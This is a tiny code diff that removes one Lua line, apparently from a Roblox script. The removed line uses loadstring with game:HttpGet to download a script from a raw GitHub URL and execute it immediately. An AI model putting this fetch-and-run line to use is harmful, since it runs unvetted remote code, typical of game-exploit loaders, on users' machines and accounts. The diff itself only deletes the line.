@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HappinessAlive/Happiness/refs/heads/main/examination_release"))()
